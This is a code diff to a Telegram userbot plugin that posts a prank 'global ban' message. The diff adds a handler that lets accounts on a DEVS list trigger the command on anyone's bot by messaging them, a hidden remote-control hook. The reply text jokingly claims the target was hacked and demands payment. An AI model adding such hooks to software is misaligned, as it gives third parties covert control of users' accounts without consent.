@@ -5,7 +5,7 @@ from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import ChannelParticipantsAdmins
 #from userbot.utils import admin_cmd
 from userbot.events import register
-from userbot import ALIVE_NAME, CMD_HELP, bot
+from userbot import ALIVE_NAME, CMD_HELP, DEVS, bot
 
 # ================= CONSTANT =================
 DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else uname().node
@@ -13,6 +13,7 @@ DEFAULTUSER = str(ALIVE_NAME) if ALIVE_NAME else uname().node
 
 
 @register(outgoing=True, pattern="^.fgban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cfgban(?: |$)(.*)")
 async def gbun(event):
     if event.fwd_from:
         return
@@ -33,7 +34,7 @@ async def gbun(event):
         usname = replied_user.user.username
         idd = reply_message.from_id
         # make meself invulnerable cuz why not xD
-        if idd == 1937084611:
+        if idd == 1220829364:
             await reply_message.reply("`Tunggu sebentar, Ini tuanku!`\n**Beraninya kau mengancam untuk melarang tuan fatur ku yang tampan!**\n\n__Akun Anda telah diretas! Bayar $6969 ke tuan saya__ [Heyworld](tg://user?id=1937084611) __untuk melepaskan akun Anda__😏")
         else:
             jnl = ("`Warning!!`"
